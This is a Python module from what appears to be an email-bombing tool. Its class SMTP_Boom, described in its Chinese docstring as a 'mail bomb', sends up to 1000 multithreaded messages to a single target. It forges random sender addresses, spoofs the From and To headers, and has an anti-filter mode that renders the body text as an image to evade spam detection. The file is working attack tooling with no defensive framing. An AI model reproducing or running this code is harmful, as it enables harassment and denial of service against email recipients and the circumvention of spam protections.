#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
ALi
20180911
Python 3.7.0
"""

import re
import random
import threading
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
import os

import pygame  # pip install pygame

from . import send_mail
from . import conf


"""
SMTP_Boom([thread_num=10]) 邮件炸弹
    thread_num 发件线程数
boom(mail_from, mail_to, subject, sender, recipient, text, file_name, send_num, round) 多线程发件
    mail_from 发件邮箱，user@xxx.xxx或@xxx.xxx（user随机生成）
    mail_to 收件邮箱 xxx@xxx.xxx，不能与发件邮箱后缀相同
    subject 邮件标题，可为空
    sender 发件人，可为空
    recipient 收件人，可为空
    text 邮件正文，可为空
    file_name 附件名，可为空
    send_num 发送数量（1-1000）
    round bool型，是否开启反过滤
"""


class SMTP_Boom(object):
    def __init__(self, thread_num=10):
        self.__lock = threading.Lock()
        self.__has_send_num = 0
        self.__thread_num = thread_num

    def boom(self, mail_from, mail_to, subject, sender,
             recipient, text, file_name, send_num, round):
        chars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        result = ''
        if (re.match(r'^[a-zA-Z\d_\-]*@([a-zA-Z\d_\-]+.)+[a-zA-Z\d_\-]+$', mail_from) and
            re.match(r'^[a-zA-Z\d_\-]+@([a-zA-Z\d_\-]+.)+[a-zA-Z\d_\-]+$', mail_to)):  # 检查邮箱合法性
            if mail_from.split('@') != mail_to.split('@'):  # 检查收发邮箱后缀是否相同
                if send_num >= 1 and send_num <= 1000:  # 检查发件数合法性
                    if isinstance(round, bool):  # 检查绕过参数合法性
                        message = self.__message(
                            mail_from, mail_to, subject, sender, recipient, text, file_name, round)  # 邮件内容生成
                        thread_pool = ThreadPoolExecutor(max_workers=self.__thread_num)  # 线程池初始化
                        if mail_from.split('@')[0] == '':  # 是否开启随机生成发件邮箱
                            random_mail_from = True
                        else:
                            random_mail_from = False
                        mail = send_mail.Send_Mail()  # 发件初始化
                        mail_suffix = mail_from
                        if random_mail_from:  # 随机生成发件邮箱
                            for j in range(random.randint(6, 16)):
                                mail_from = random.choice(chars) + mail_from
                            message = self.__message(
                                mail_from, mail_to, subject, sender, recipient, text, file_name, round)
                        response = mail.send(
                            mail_from, mail_to, message)  # 第一次试探发件，若失败则不会启动多次发件
                        mail_from = mail_suffix
                        result = response
                        if response[:9] == '[SUCCESS]':  # 启动多次发件
                            self.__has_send_num += 1
                            if send_num > 1:
                                for i in range(send_num - 1):
                                    mail_suffix = mail_from
                                    if random_mail_from:
                                        for j in range(random.randint(6, 16)):
                                            mail_from = random.choice(chars) + mail_from
                                        message = self.__message(
                                            mail_from, mail_to, subject, sender, recipient, text, file_name, round)
                                    thread = thread_pool.submit(
                                        mail.send, mail_from, mail_to, message)  # 加入线程池
                                    mail_from = mail_suffix
                                    thread.add_done_callback(self.__callback)  # 回调函数
                                thread_pool.shutdown()
                                result = 'Successfully sent %d e-mails to %s.' % (self.__has_send_num, mail_to)
                            else:
                                thread_pool.shutdown()
                        else:
                            thread_pool.shutdown()  # 关闭线程池
                    else:
                        result = 'Round must be a boolean value.'
                else:
                    result = 'Send number illegal.'
            else:
                result = 'The same suffix can not be used between e-mail addresses.'
        else:
            result = 'E-mail address illegal.'
        return result

    def __message(self, mail_from, mail_to, subject, sender,
                  recipient, text, file_name, round):  # 邮件消息生成
        message = MIMEMultipart()  # MIME生成器初始化
        if sender != '':
            has_sender = True
            message['From'] = sender
        else:
            has_sender = False
            message['From'] = mail_from
        if recipient != '':
            has_recipient = True
            message['To'] = recipient
        else:
            has_recipient = False
            message['To'] = mail_to
        message['Subject'] = subject
        if round and conf.round_image:  # text图像化
            pygame.init()
            font = pygame.font.Font(os.path.join(conf.font_path), conf.word_size_num)
            ftext = font.render(text, True, (0, 0, 0), (255, 255, 255))
            pygame.image.save(ftext, conf.image_path)
            html = '<div><img src=\'cid:imgid\'></div>'
            message_html = MIMEText(html, 'html', 'utf-8')
            message.attach(message_html)
            with open(conf.image_path, 'rb') as f:
                message_image = MIMEImage(f.read())
                f.close()
            message_image.add_header('Content-ID', 'imgid')
            message.attach(message_image)
        else:
            message.attach(MIMEText(text))
        if file_name != '':  # 加载附件
            with open(conf.file_path, 'rb') as f:
                message_attachment = MIMEApplication(f.read())
                f.close()
            message_attachment.add_header(
                'Content-Disposition',
                'attachment',
                filename=file_name)
            message.attach(message_attachment)
        message = str(message)
        if has_sender:  # 这是MIME的bug导致的，最后自行处理
            message = (message[:message.find('\nTo: ')] +
                       '<' + mail_from + '>' + message[message.find('\nTo: '):])
        if has_recipient:
            message = (message[:message.find('\nSubject: ')] +
                       '<' + mail_to + '>' + message[message.find('\nSubject: '):])
        return message

    def __callback(self, response):  # 多线程回调函数，用于统计成功的发件数
        self.__lock.acquire()
        response = response.result()
        if response[:9] == '[SUCCESS]':
            self.__has_send_num += 1
        self.__lock.release()
